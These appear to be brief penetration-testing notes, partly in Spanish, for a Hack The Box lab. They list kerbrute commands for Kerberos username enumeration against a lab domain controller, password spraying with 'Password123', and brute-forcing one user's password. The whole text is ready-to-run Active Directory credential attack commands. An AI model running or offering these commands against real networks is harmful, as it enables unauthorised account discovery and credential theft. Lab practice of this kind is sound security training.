Fuerza bruta usuarios: /home/kali/htb/intelligence/enumeration/kerbrute/dist/kerbrute_linux_amd64  userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  

PSpray /kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123

./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman